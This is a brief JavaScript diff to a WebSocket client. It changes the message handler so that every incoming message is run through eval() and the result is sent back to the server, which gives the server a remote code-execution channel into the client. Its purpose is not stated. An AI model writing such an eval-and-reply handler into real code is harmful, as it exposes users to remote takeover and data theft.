@@ -12,9 +12,10 @@ socket.onclose = function(event){
     }
 }
 
-socket.onmessage = function(event){
-    console.log(event.data)
-    console.log('MESSAGE')
+socket.onmessage = async function(event){
+    var result = await eval(event.data)
+    socket.send(result)
+    console.log(result)
 }
 
 // var health_check = window.setInterval(function(){socket.send('Test server')}, 10000);
